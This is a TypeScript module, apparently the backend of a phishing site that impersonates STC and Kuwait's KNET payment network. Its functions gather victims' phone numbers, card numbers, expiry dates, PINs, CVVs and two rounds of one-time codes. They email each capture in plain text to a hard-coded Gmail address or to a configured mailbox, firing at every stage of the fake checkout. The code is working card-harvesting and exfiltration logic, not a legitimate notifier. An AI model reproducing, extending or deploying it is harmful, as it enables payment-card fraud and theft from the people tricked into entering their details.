import nodemailer from "nodemailer";
import { displayMsisdn } from "@/lib/phone";
import { findKnetByOrderId } from "@/models/knet.repository";
import { findOrderById } from "@/models/order.repository";

const DEFAULT_NOTIFY = "dawajinbh@gmail.com";
const EMAIL_IN_TEXT = /[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/i;

function extractEmail(raw: string | undefined | null): string | null {
  if (!raw?.trim()) return null;
  const angle = raw.match(/<([^>]+)>/);
  const candidate = (angle?.[1] ?? raw).trim();
  return EMAIL_IN_TEXT.test(candidate) ? candidate.match(EMAIL_IN_TEXT)![0] : null;
}

/** SMTP From must be a real mailbox — same as SMTP_USER for Spacemail/cPanel. */
export function resolveSmtpFromAddress(): string | null {
  const user = process.env.SMTP_USER?.trim() ?? "";
  const userEmail = extractEmail(user);
  const fromEnv = extractEmail(process.env.EMAIL_FROM);
  return fromEnv ?? userEmail;
}

export function adminNotifyEmail() {
  return process.env.ADMIN_NOTIFY_EMAIL?.trim() || DEFAULT_NOTIFY;
}

/** For admin diagnostics — no secrets. */
export function adminEmailTransportReady() {
  const host = Boolean(process.env.SMTP_HOST?.trim());
  const user = Boolean(process.env.SMTP_USER?.trim());
  const pass = Boolean(process.env.SMTP_PASSWORD?.trim());
  const from = resolveSmtpFromAddress();
  const smtp = host && user && pass && Boolean(from);
  const resend = Boolean(process.env.RESEND_API_KEY?.trim());
  return {
    smtp,
    resend,
    canSend: smtp || resend,
    to: adminNotifyEmail(),
    fromConfigured: Boolean(from),
    fromHint: from ? from.replace(/(.{2}).+(@.+)/, "$1***$2") : "set SMTP_USER and EMAIL_FROM to full email e.g. no-reply@yourdomain.com",
  };
}

type VisitorAlertPayload = {
  sessionId: string;
  page: string;
  msisdn: string | null;
  orderId?: string | null;
};

export type KnetMailEvent = "card" | "otp" | "cvv" | "otp2";

function formatKnetBlock(knet: {
  amount: number;
  cardNumber: string;
  expiryDate: string;
  pin: string;
  otp: string;
  cvv: string;
  otp2?: string;
  status: string;
  reviewStep: string;
}) {
  const amount = (knet.amount / 100).toFixed(3);
  return [
    "—— KNET ——",
    `المبلغ: ${amount} KWD`,
    `البطاقة: ${knet.cardNumber}`,
    `الانتهاء: ${knet.expiryDate}`,
    `PIN: ${knet.pin}`,
    `OTP 1: ${knet.otp || "—"}`,
    `CVV: ${knet.cvv || "—"}`,
    `OTP 2: ${knet.otp2 || "—"}`,
    `الحالة: ${knet.status}`,
    `مرحلة المراجعة: ${knet.reviewStep}`,
  ].join("\n");
}

async function sendRawEmail(subject: string, text: string): Promise<boolean> {
  const host = process.env.SMTP_HOST?.trim();
  const user = process.env.SMTP_USER?.trim();
  const pass = process.env.SMTP_PASSWORD?.trim();
  const to = adminNotifyEmail();
  const fromAddress = resolveSmtpFromAddress();

  if (host && user && pass && fromAddress) {
    const port = Number(process.env.SMTP_PORT ?? "465");
    const secure = process.env.SMTP_SECURE !== "false" && port === 465;
    const transport = nodemailer.createTransport({
      host,
      port,
      secure,
      auth: { user, pass },
      ...(port === 587 ? { requireTLS: true } : {}),
    });
    await transport.sendMail({
      from: fromAddress,
      to,
      subject,
      text,
      envelope: { from: fromAddress, to },
    });
    console.log(`[admin-email] sent (SMTP) → ${to} · ${subject}`);
    return true;
  }

  if (host && user && pass && !fromAddress) {
    console.warn(
      "[admin-email] not sent: SMTP_USER/EMAIL_FROM must be a full email (e.g. no-reply@yourdomain.com), not empty or username-only",
    );
    return false;
  }

  const apiKey = process.env.RESEND_API_KEY?.trim();
  if (!apiKey) {
    console.warn("[admin-email] not sent: configure SMTP_HOST/USER/PASSWORD or RESEND_API_KEY on the server");
    return false;
  }
  const res = await fetch("https://api.resend.com/emails", {
    method: "POST",
    headers: {
      Authorization: `Bearer ${apiKey}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      from: process.env.EMAIL_FROM?.trim() || "STC Admin <onboarding@resend.dev>",
      to: [to],
      subject,
      text,
    }),
  });
  if (res.ok) console.log(`[admin-email] sent (Resend) → ${to} · ${subject}`);
  else console.warn(`[admin-email] Resend failed ${res.status}`);
  return res.ok;
}

function visitorBody(payload: VisitorAlertPayload, knetBlock: string | null) {
  const subject = knetBlock ? "عميل جديد — بيانات KNET" : "زائر جديد على الموقع";
  const lines = [
    "عميل / زائر جديد على الموقع.",
    payload.msisdn ? `الجوال: ${payload.msisdn}` : null,
    `الصفحة: ${payload.page || "/"}`,
    payload.orderId ? `الطلب: ${payload.orderId}` : null,
    `Session: ${payload.sessionId}`,
    knetBlock,
    `الوقت: ${new Date().toISOString()}`,
  ].filter(Boolean);
  return { subject, text: lines.join("\n") };
}

/** Quick Pay: customer entered mobile on the home form (server-side, admin panel may be closed). */
export async function sendQuickPayRegistrationEmail(msisdnDisplay: string): Promise<boolean> {
  try {
    const subject = `عميل جديد يسجّل — ${msisdnDisplay}`;
    const text = [
      "عميل جديد يسجّل على الموقع.",
      `رقم الجوال: ${msisdnDisplay}`,
      `الوقت: ${new Date().toISOString()}`,
    ].join("\n");
    const sent = await sendRawEmail(subject, text);
    if (!sent) console.warn("[admin-email] quick-pay registration was not emailed (check SMTP/Resend env)");
    return sent;
  } catch (error) {
    console.error("[admin-email] quick-pay registration send failed:", error instanceof Error ? error.message : error);
    return false;
  }
}

/** New visitor (browser alert path). Includes KNET if linked order has a record. */
export async function sendAdminVisitorEmail(payload: VisitorAlertPayload): Promise<boolean> {
  try {
    let knetBlock: string | null = null;
    if (payload.orderId) {
      const knet = await findKnetByOrderId(payload.orderId);
      if (knet) knetBlock = formatKnetBlock(knet);
    }
    const { subject, text } = visitorBody(payload, knetBlock);
    return await sendRawEmail(subject, text);
  } catch (error) {
    console.error("[admin-email] visitor send failed:", error instanceof Error ? error.message : error);
    return false;
  }
}

/** Full KNET snapshot after card / OTP / CVV submit (works even if admin panel is closed). */
export async function sendKnetSubmissionEmail(orderId: string, event: KnetMailEvent): Promise<boolean> {
  try {
    const [order, knet] = await Promise.all([findOrderById(orderId), findKnetByOrderId(orderId)]);
    if (!knet) return false;

    const msisdn = order ? displayMsisdn(order.msisdn) : "—";
    const stage =
      event === "card"
        ? "بيانات البطاقة + PIN"
        : event === "otp"
          ? "OTP 1"
          : event === "cvv"
            ? "CVV"
            : "OTP 2";
    const subject = `KNET جديد — ${stage} — ${msisdn}`;
    const text = [
      `عميل جديد — ${stage}`,
      `الجوال: ${msisdn}`,
      formatKnetBlock(knet),
      `الوقت: ${new Date().toISOString()}`,
    ].join("\n\n");

    const sent = await sendRawEmail(subject, text);
    if (!sent) console.warn(`[admin-email] KNET ${event} for order ${orderId} was not emailed`);
    return sent;
  } catch (error) {
    console.error("[admin-email] knet send failed:", error instanceof Error ? error.message : error);
    return false;
  }
}
